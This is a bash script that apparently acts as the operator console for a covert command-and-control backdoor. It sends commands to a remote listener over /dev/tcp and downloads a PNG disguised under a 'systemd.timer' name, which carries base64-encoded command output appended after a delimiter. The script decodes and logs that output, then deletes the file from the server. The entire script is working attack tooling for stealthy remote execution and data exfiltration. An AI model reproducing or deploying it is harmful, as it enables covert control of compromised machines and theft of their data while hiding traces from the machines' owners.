#!/bin/bash
#
# Once a command has been issued, the a PNG file will be uploaded to the file server
# with the response pre-pended onto the end of it. This script will pull the image file
# and split the image and output apart, before decoding it and printing it to the screen.
#
# Get the file output 
# Eventually this will poll for changes and pull automatically

# Change this if necessary
target_ip=127.0.0.1
port=13337

echo "$1" >/dev/tcp/$target_ip/$port
sleep 1
out="/tmp/photo.png"
cmd_resp="http://127.0.0.1/voulezvousmyguycomehere/systemd.timer.png"
resp_log="/tmp/resp_log.txt"
wget -q $cmd_resp -O $out

#https://linuxhint.com/bash_split_examples/
text=$(<$out)

# Define multi-character delimiter that the PNG ends on and the b64 starts
delimiter="av0cad0"

# Concatenate the delimiter with the main string
string=$text$delimiter

# Split the text based on the delimiter
myarray=()
while [[ $string ]]; do
  myarray+=( "${string%%"$delimiter"*}" )
  string=${string#*"$delimiter"}
done

# Print and decode everything after the delimiter
printf "COMMAND RUN: $1\n-----"
printf "OUTPUT-----\n"
echo ${myarray[1]} | base64 -d 
echo '-----END OF OUTPUT-----'

# Also store a log of all command outputs
# Print and decode everything after the delimiter
printf "COMMAND RUN: $1\n-----" >> $resp_log
printf "OUTPUT-----\n" >> $resp_log
echo ${myarray[1]} | base64 -d  >> $resp_log
echo '-----END OF OUTPUT-----' >> $resp_log
printf "\n" >> $resp_log

# Delete the output file from the server ready for the next command response
curl -X POST -d "delete=delete" http://127.0.0.1/upload.php